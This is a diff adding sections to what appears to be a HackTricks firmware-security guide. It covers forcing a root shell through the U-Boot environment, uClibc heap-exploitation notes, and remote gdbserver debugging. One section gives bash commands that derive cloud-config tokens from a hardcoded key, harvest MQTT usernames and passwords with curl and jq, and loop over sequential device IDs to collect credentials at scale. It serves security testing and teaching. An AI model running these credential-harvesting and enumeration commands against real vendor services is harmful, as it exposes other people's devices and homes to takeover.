@@ -11,6 +11,17 @@
 synology-encrypted-archive-decryption.md
 {{#endref}}
 
+{{#ref}}
+../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
+{{#endref}}
+
+{{#ref}}
+android-mediatek-secure-boot-bl2_ext-bypass-el3.md
+{{#endref}}
+
+{{#ref}}
+mediatek-xflash-carbonara-da2-hash-bypass.md
+{{#endref}}
 
 Firmware is essential software that enables devices to operate correctly by managing and facilitating communication between the hardware components and the software that users interact with. It's stored in permanent memory, ensuring the device can access vital instructions from the moment it's powered on, leading to the operating system's launch. Examining and potentially modifying firmware is a critical step in identifying security vulnerabilities.
 
@@ -44,6 +55,19 @@ Obtaining firmware can be approached through various means, each with its own le
 - Identifying and using **hardcoded update endpoints**
 - **Dumping** from the bootloader or network
 - **Removing and reading** the storage chip, when all else fails, using appropriate hardware tools
+
+### UART-only logs: force a root shell via U-Boot env in flash
+
+If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:
+
+1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
+   ```bash
+   flashrom -p ch341a_spi -r flash.bin
+   ```
+2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
+3. Reflash only the env partition and reboot; a shell should appear on UART.
+
+This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.
 
 ## Analyzing the firmware
 
@@ -181,7 +205,86 @@ Several tools assist in uncovering sensitive information and vulnerabilities wit
 
 Both source code and compiled binaries found in the filesystem must be scrutinized for vulnerabilities. Tools like **checksec.sh** for Unix binaries and **PESecurity** for Windows binaries help identify unprotected binaries that could be exploited.
 
-## Emulating Firmware for Dynamic Analysis
+## Harvesting cloud config and MQTT credentials via derived URL tokens
+
+Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like:
+
+- `https://<api-host>/pf/<deviceId>/<token>`
+
+During firmware analysis you may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example:
+
+- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
+
+This design enables anyone who learns a deviceId and the STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.
+
+Practical workflow:
+
+1) Extract deviceId from UART boot logs
+
+- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
+
+```bash
+picocom -b 115200 /dev/ttyUSB0
+```
+
+- Look for lines printing the cloud config URL pattern and broker address, for example:
+
+```
+Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
+MQTT: mqtt://mq-gw.vendor.tld:8001
+```
+
+2) Recover STATIC_KEY and token algorithm from firmware
+
+- Load binaries into Ghidra/radare2 and search for the config path ("/pf/") or MD5 usage.
+- Confirm the algorithm (e.g., MD5(deviceId||STATIC_KEY)).
+- Derive the token in Bash and uppercase the digest:
+
+```bash
+DEVICE_ID="d88b00112233"
+STATIC_KEY="cf50deadbeefcafebabe"
+printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
+```
+
+3) Harvest cloud config and MQTT credentials
+
+- Compose the URL and pull JSON with curl; parse with jq to extract secrets:
+
+```bash
+API_HOST="https://api.vendor.tld"
+TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
+curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
+# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
+```
+
+4) Abuse plaintext MQTT and weak topic ACLs (if present)
+
+- Use recovered credentials to subscribe to maintenance topics and look for sensitive events:
+
+```bash
+mosquitto_sub -h <broker> -p <port> -V mqttv311 \
+  -i <client_id> -u <username> -P <password> \
+  -t "<topic_prefix>/<deviceId>/admin" -v
+```
+
+5) Enumerate predictable device IDs (at scale, with authorization)
+
+- Many ecosystems embed vendor OUI/product/type bytes followed by a sequential suffix.
+- You can iterate candidate IDs, derive tokens and fetch configs programmatically:
+
+```bash
+API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
+for SUF in $(seq -w 000000 0000FF); do
+  DEVICE_ID="${PREFIX}${SUF}"
+  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
+  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
+done
+```
+
+Notes
+- Always obtain explicit authorization before attempting mass enumeration.
+- Prefer emulation or static analysis to recover secrets without modifying target hardware when possible.
+
 
 The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.
 
@@ -221,9 +324,29 @@ At this stage, either a real or emulated device environment is used for analysis
 
 Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.
 
+For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
+
+```bash
+# On device
+gdbserver :1234 /usr/bin/targetd
+```
+
+```bash
+# On host
+gdb-multiarch /path/to/targetd
+target remote <device-ip>:1234
+```
+
 ## Binary Exploitation and Proof-of-Concept
 
 Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.
+
+### uClibc fastbin exploitation notes (embedded Linux)
+
+- **Fastbins + consolidation:** uClibc uses fastbins similar to glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size, `fd = 0`, and surrounding chunks seen as "in use").
+- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid heap chunk header to land a fastbin allocation on a **function pointer table**.
+- **Parser-stopping NUL:** when JSON is parsed, a `\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP chain.
+- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open("/proc/self/mem")`, `lseek()`, and `write()` can plant executable shellcode in a known mapping and jump to it.
 
 ## Prepared Operating Systems for Firmware Analysis
 
@@ -298,16 +421,16 @@ To practice discovering vulnerabilities in firmware, use the following vulnerabl
 - Damn Vulnerable IoT Device (DVID)
   - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
+## Trainning and Cert
+
+- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
+
 ## References
 
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 - [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-
-## Trainning and Cert
-
-- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
+- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
+- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
